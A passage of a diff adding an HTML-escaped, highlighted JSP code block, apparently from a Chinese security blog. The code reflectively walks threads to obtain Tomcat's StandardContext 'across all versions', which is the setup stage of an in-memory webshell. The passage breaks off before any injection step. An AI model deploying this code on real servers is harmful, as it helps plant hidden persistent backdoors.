+&lt;/span&gt;&lt;span class="lnt"&gt; 53
+&lt;/span&gt;&lt;span class="lnt"&gt; 54
+&lt;/span&gt;&lt;span class="lnt"&gt; 55
+&lt;/span&gt;&lt;span class="lnt"&gt; 56
+&lt;/span&gt;&lt;span class="lnt"&gt; 57
+&lt;/span&gt;&lt;span class="lnt"&gt; 58
+&lt;/span&gt;&lt;span class="lnt"&gt; 59
+&lt;/span&gt;&lt;span class="lnt"&gt; 60
+&lt;/span&gt;&lt;span class="lnt"&gt; 61
+&lt;/span&gt;&lt;span class="lnt"&gt; 62
+&lt;/span&gt;&lt;span class="lnt"&gt; 63
+&lt;/span&gt;&lt;span class="lnt"&gt; 64
+&lt;/span&gt;&lt;span class="lnt"&gt; 65
+&lt;/span&gt;&lt;span class="lnt"&gt; 66
+&lt;/span&gt;&lt;span class="lnt"&gt; 67
+&lt;/span&gt;&lt;span class="lnt"&gt; 68
+&lt;/span&gt;&lt;span class="lnt"&gt; 69
+&lt;/span&gt;&lt;span class="lnt"&gt; 70
+&lt;/span&gt;&lt;span class="lnt"&gt; 71
+&lt;/span&gt;&lt;span class="lnt"&gt; 72
+&lt;/span&gt;&lt;span class="lnt"&gt; 73
+&lt;/span&gt;&lt;span class="lnt"&gt; 74
+&lt;/span&gt;&lt;span class="lnt"&gt; 75
+&lt;/span&gt;&lt;span class="lnt"&gt; 76
+&lt;/span&gt;&lt;span class="lnt"&gt; 77
+&lt;/span&gt;&lt;span class="lnt"&gt; 78
+&lt;/span&gt;&lt;span class="lnt"&gt; 79
+&lt;/span&gt;&lt;span class="lnt"&gt; 80
+&lt;/span&gt;&lt;span class="lnt"&gt; 81
+&lt;/span&gt;&lt;span class="lnt"&gt; 82
+&lt;/span&gt;&lt;span class="lnt"&gt; 83
+&lt;/span&gt;&lt;span class="lnt"&gt; 84
+&lt;/span&gt;&lt;span class="lnt"&gt; 85
+&lt;/span&gt;&lt;span class="lnt"&gt; 86
+&lt;/span&gt;&lt;span class="lnt"&gt; 87
+&lt;/span&gt;&lt;span class="lnt"&gt; 88
+&lt;/span&gt;&lt;span class="lnt"&gt; 89
+&lt;/span&gt;&lt;span class="lnt"&gt; 90
+&lt;/span&gt;&lt;span class="lnt"&gt; 91
+&lt;/span&gt;&lt;span class="lnt"&gt; 92
+&lt;/span&gt;&lt;span class="lnt"&gt; 93
+&lt;/span&gt;&lt;span class="lnt"&gt; 94
+&lt;/span&gt;&lt;span class="lnt"&gt; 95
+&lt;/span&gt;&lt;span class="lnt"&gt; 96
+&lt;/span&gt;&lt;span class="lnt"&gt; 97
+&lt;/span&gt;&lt;span class="lnt"&gt; 98
+&lt;/span&gt;&lt;span class="lnt"&gt; 99
+&lt;/span&gt;&lt;span class="lnt"&gt;100
+&lt;/span&gt;&lt;span class="lnt"&gt;101
+&lt;/span&gt;&lt;span class="lnt"&gt;102
+&lt;/span&gt;&lt;span class="lnt"&gt;103
+&lt;/span&gt;&lt;span class="lnt"&gt;104
+&lt;/span&gt;&lt;span class="lnt"&gt;105
+&lt;/span&gt;&lt;span class="lnt"&gt;106
+&lt;/span&gt;&lt;span class="lnt"&gt;107
+&lt;/span&gt;&lt;span class="lnt"&gt;108
+&lt;/span&gt;&lt;span class="lnt"&gt;109
+&lt;/span&gt;&lt;span class="lnt"&gt;110
+&lt;/span&gt;&lt;span class="lnt"&gt;111
+&lt;/span&gt;&lt;span class="lnt"&gt;112
+&lt;/span&gt;&lt;span class="lnt"&gt;113
+&lt;/span&gt;&lt;span class="lnt"&gt;114
+&lt;/span&gt;&lt;span class="lnt"&gt;115
+&lt;/span&gt;&lt;span class="lnt"&gt;116
+&lt;/span&gt;&lt;span class="lnt"&gt;117
+&lt;/span&gt;&lt;span class="lnt"&gt;118
+&lt;/span&gt;&lt;span class="lnt"&gt;119
+&lt;/span&gt;&lt;span class="lnt"&gt;120
+&lt;/span&gt;&lt;span class="lnt"&gt;121
+&lt;/span&gt;&lt;span class="lnt"&gt;122
+&lt;/span&gt;&lt;span class="lnt"&gt;123
+&lt;/span&gt;&lt;span class="lnt"&gt;124
+&lt;/span&gt;&lt;span class="lnt"&gt;125
+&lt;/span&gt;&lt;span class="lnt"&gt;126
+&lt;/span&gt;&lt;span class="lnt"&gt;127
+&lt;/span&gt;&lt;span class="lnt"&gt;128
+&lt;/span&gt;&lt;span class="lnt"&gt;129
+&lt;/span&gt;&lt;span class="lnt"&gt;130
+&lt;/span&gt;&lt;span class="lnt"&gt;131
+&lt;/span&gt;&lt;span class="lnt"&gt;132
+&lt;/span&gt;&lt;span class="lnt"&gt;133
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;
+    &lt;span class="c1"&gt;// 获取当前的StandardContext  以下方式失效
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="c1"&gt;// org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="c1"&gt;//         (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="c1"&gt;// StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;
+    &lt;span class="c1"&gt;// Tomcat全版本下获取StandardContext对象
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Tomcat6789&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;uri&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;serverName&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+        &lt;span class="n"&gt;StandardContext&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="nf"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;fieldName&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;declaredField&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clazz&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+                    &lt;span class="n"&gt;declaredField&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fieldName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;declaredField&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;declaredField&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NoSuchFieldException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;){}&lt;/span&gt;
+                &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IllegalAccessException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;){}&lt;/span&gt;
+                &lt;span class="n"&gt;clazz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSuperclass&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+        &lt;span class="o"&gt;}&lt;/span&gt;
+
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;Tomcat6789&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;threads&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;currentThread&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getThreadGroup&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;threads&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;contains&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;target&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(!(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="k"&gt;instanceof&lt;/span&gt; &lt;span class="n"&gt;Runnable&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+
+                &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;this$0&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;handler&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;global&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ArrayList&lt;/span&gt; &lt;span class="n"&gt;processors&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;processors&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Iterator&lt;/span&gt; &lt;span class="n"&gt;iterator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;processors&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hasNext&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;next&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;req&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;serverPort&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;serverPort&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serverPort&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(-&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)){&lt;/span&gt;&lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;}&lt;/span&gt;
+                    &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MessageBytes&lt;/span&gt; &lt;span class="n"&gt;serverNameMB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MessageBytes&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;serverNameMB&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serverNameMB&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;strValue&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;serverNameMB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;serverNameMB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+
+                    &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MessageBytes&lt;/span&gt; &lt;span class="n"&gt;uriMB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tomcat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MessageBytes&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;uriMB&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uriMB&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;strValue&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uriMB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uriMB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+
+                    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="o"&gt;}&lt;/span&gt;
+
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;threads&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;currentThread&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getThreadGroup&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;threads&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
